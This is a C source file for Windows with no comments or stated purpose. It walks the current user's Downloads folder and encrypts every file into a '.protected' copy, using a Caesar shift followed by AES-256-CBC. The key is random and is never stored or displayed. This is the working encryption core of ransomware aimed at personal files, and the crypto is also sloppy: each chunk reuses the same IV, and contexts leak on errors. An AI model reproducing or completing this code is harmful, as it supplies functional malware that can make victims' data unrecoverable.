#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define AES_KEY_LENGTH 256
#define BUFFER_SIZE 4096
#define CAESAR_SHIFT 3

void caesar_encrypt(unsigned char *data, size_t length) {
    for (size_t i = 0; i < length; i++) {
        data[i] = (unsigned char)((data[i] + CAESAR_SHIFT) % 256);
    }
}

int aes_encrypt(const unsigned char *plaintext, size_t plaintext_len, const unsigned char *key, const unsigned char *iv, unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    if (!(ctx = EVP_CIPHER_CTX_new()))
        return -1;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1)
        return -1;

    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, (int)plaintext_len) != 1)
        return -1;
    ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1)
        return -1;
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

void encrypt_file(const char *filepath, const unsigned char *key, const unsigned char *iv) {
    FILE *input_file = fopen(filepath, "rb");
    if (!input_file) {
        fprintf(stderr, "Failed to open file: %s\n", filepath);
        return;
    }

    char encrypted_filepath[MAX_PATH];
    snprintf(encrypted_filepath, MAX_PATH, "%s.protected", filepath);

    FILE *output_file = fopen(encrypted_filepath, "wb");
    if (!output_file) {
        fprintf(stderr, "Failed to create encrypted file: %s\n", encrypted_filepath);
        fclose(input_file);
        return;
    }

    unsigned char buffer[BUFFER_SIZE];
    unsigned char encrypted_buffer[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    size_t bytes_read;
    int encrypted_bytes;

    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, input_file)) > 0) {
        caesar_encrypt(buffer, bytes_read);

        encrypted_bytes = aes_encrypt(buffer, bytes_read, key, iv, encrypted_buffer);
        if (encrypted_bytes < 0) {
            fprintf(stderr, "Encryption failed for file: %s\n", filepath);
            fclose(input_file);
            fclose(output_file);
            return;
        }

        fwrite(encrypted_buffer, 1, encrypted_bytes, output_file);
    }

    fclose(input_file);
    fclose(output_file);

    printf("File encrypted: %s\n", encrypted_filepath);
}

void encrypt_directory(const char *directory, const unsigned char *key, const unsigned char *iv) {
    WIN32_FIND_DATA find_data;
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", directory);

    HANDLE hFind = FindFirstFile(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Failed to open directory: %s\n", directory);
        return;
    }

    do {
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        char filepath[MAX_PATH];
        snprintf(filepath, MAX_PATH, "%s\\%s", directory, find_data.cFileName);
        encrypt_file(filepath, key, iv);

    } while (FindNextFile(hFind, &find_data) != 0);

    FindClose(hFind);
}

int main() {
    char *user_profile = getenv("USERPROFILE");
    if (!user_profile) {
        fprintf(stderr, "Failed to get USERPROFILE environment variable.\n");
        return 1;
    }

    char downloads_path[MAX_PATH];
    snprintf(downloads_path, MAX_PATH, "%s\\Downloads", user_profile);

    unsigned char key[AES_KEY_LENGTH / 8];
    unsigned char iv[EVP_MAX_IV_LENGTH];

    if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv))) {
        fprintf(stderr, "Failed to generate encryption key or IV.\n");
        return 1;
    }

    encrypt_directory(downloads_path, key, iv);

    return 0;
}
